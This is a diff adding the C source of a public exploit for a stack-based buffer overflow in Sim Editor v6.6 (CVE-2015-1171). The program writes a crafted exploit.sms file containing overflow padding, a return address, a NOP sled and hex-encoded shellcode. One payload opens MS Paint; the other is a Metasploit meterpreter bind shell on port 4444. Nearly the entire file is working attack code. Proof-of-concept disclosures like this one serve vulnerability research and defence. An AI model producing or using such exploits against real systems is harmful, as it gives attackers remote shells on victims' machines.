@@ -1,0 +1,135 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define SIZE 65536  
+
+/*
+ * Title: Sim Editor v6.6 Stack Based Buffer Overflow
+ * Version: 6.6
+ * Tested on: Windows XP sp2 en, Windows 8 64-bit
+ * Date: 16-01-2015
+ * Author: Osanda Malith Jayathissa
+ * E-Mail: osanda[cat]unseen.is
+ * Website: OsandaMalith.wordpress.com
+ * CVE: CVE-2015-1171
+ */
+
+const char shell1[] = "ba516a43ddd9e9d97424f45e33c9b1" 
+        		"3231561503561583eefce2a496ab54" 
+        		"46672c07cf821d15abc70ca9b88abc"
+        		"42ec3e36263830ff8d1e7f00209ed3"
+        		"c222622e17855be16ac49c1c849475"
+        		"6a3709f22e8428d424b45251fa41e9"
+        		"582bf96612d3712082e25632feadd3"
+        		"81752c32d8761e7ab749ae77c98e09"
+        		"68bce46915c73f13c142ddb382f505"
+        		"454663ce4923e7884db224a36a3fcb"
+        		"63fb7be8a7a7d891fe0d8eaee0ea6f"
+        		"0b6b187b2d36777abf4d3e7cbf4d11"
+        		"158ec6fe620f0dbb9d450fea3500da"
+        		"ae5bb331ec6530b38d9128b688deee"
+        		"2be14f9b4b566f8e262bff50d1a58b"
+        		"92"; 
+
+/* msfpayload windows/meterpreter/bind_tcp EXITFUNC=thread LPORT=4444 R | msfencode -a x86 -t c */
+const char shell2[] = "bb3ff8edc8dbc6d97424f45f2bc9b1"
+		"4a83effc315f11035f11e2ca04054e"
+		"34f5d62fbd10e77dd9515ab2aa3457"
+		"39feacec4fd6c345e500ed56cb8ca1"
+		"954d70b8c9ad49731caf8e6eeffd47"
+		"e44212ecb85e99be2ce77e744cc6d0"
+		"0317c8d3c02341cc050f1b67fdfb9a"
+		"a1cc04ad8d823a0100db7ba6fbae77"
+		"d486a843a65c3d560016e5b2b0fb73"
+		"30beb0f01ea347d514dfccd8fa6996"
+		"fede324c9f479f23a098479b04d26a"
+		"c831b9e23d7342f3290431c1f6bedd"
+		"697e18198d55dcb570561c9fb6024c"
+		"b71f2b07479ffe87170f5167c8ef01"
+		"0f02e07e2f2d2a179e098670e2ad38"
+		"dd6b4b50cd3dc3cd2f1adc6a4f4970"
+		"22c7c69ef4e8d7b45644705f2d8645"
+		"7e3283ee17a5597e55575dab0f97cb"
+		"5786c06355ff272ca62a3ce532952b"
+		"0ad215ac5cb815c4389845f14635fa"
+		"aad2b5ab1f74dd5179b242a9ac42bf"
+		"7c89c0c90af908";
+
+const char *shells[] = { shell1, shell2 };
+const char *shell_names[] = { "MS Paint", "Bind Shell" };
+const char *shell_info[] = { "", "[*] Connect on port 4444\n" };
+const size_t SHELLS_COUNT = 2;
+
+int menu() {
+    size_t shell_type = SHELLS_COUNT;
+    puts("\b[?] Choose an Option: ");
+    size_t i;
+    for (i = 0; i < SHELLS_COUNT; i++) printf("%d. %s\n", i, shell_names[i]);
+    scanf("%i", &shell_type);
+	return shell_type;
+}
+
+void banner() {
+    static const char banner[] =                                                                                                
+                " _____ _          _____   _ _ _           \n"
+                "|   __|_|_____   |   __|_| |_| |_ ___ ___ \n"
+                "|__   | |     |  |   __| . | |  _| . |  _|\n"
+                "|_____|_|_|_|_|  |_____|___|_|_| |___|_|\n"
+                "\n[~] Sim Editor v6.6 Stack Based Buffer Overflow\n"
+                "[~] Author: Osanda Malith Jayathissa\n"
+                "[~] E-Mail: osanda[cat]unseen.is\n"
+                "[~] Website: OsandaMalith.wordpress.com\n\n";
+
+    fwrite(banner, sizeof(char), sizeof(banner) , stdout);
+}
+
+void patternfill(char *dst, char *pattern, size_t count, size_t dst_size) {
+    size_t pattern_len = strlen(pattern);
+    count *= pattern_len;
+    if (count > dst_size) count = dst_size;
+    if (pattern_len > dst_size) pattern_len = dst_size;
+
+    size_t i, pI;
+    for (i = 0, pI = 0; i < count ; i++, pI++) {
+        if (pI == pattern_len) pI = 0;
+        dst[i] = pattern[pI];
+    }
+}
+
+int main() {
+    banner();
+    int shell_type = menu();
+    if (shell_type >= SHELLS_COUNT) {
+        printf("[-] Enter a valid input\n");
+        exit (1);
+    }
+
+    char *buff = (char*) calloc (SIZE, sizeof(char));
+    char *nops = (char*) calloc (SIZE, sizeof(char));
+    if (!buff || !nops) exit (1);
+
+    patternfill(buff, "41", 405, SIZE);
+    patternfill(nops, "90", 16, SIZE);
+
+    char ret[] = "B3804200";
+    const char* filename = "exploit.sms";
+
+    FILE *outfile = fopen(filename, "w");
+    if (!outfile) {
+        printf("%s\n","Could not open file");
+        exit (1);
+    }
+
+    fputs(buff,   outfile);
+    fputs(ret,    outfile);
+    fputs(nops,   outfile);
+
+    fputs(shells[shell_type],  outfile);
+    printf("%s", shell_info[shell_type]);
+    fclose(outfile);
+    free(buff);
+    printf("[+] Successfully to written to: \"%s\"\n", filename); 
+    return 0;
+}
+/*EOF*/
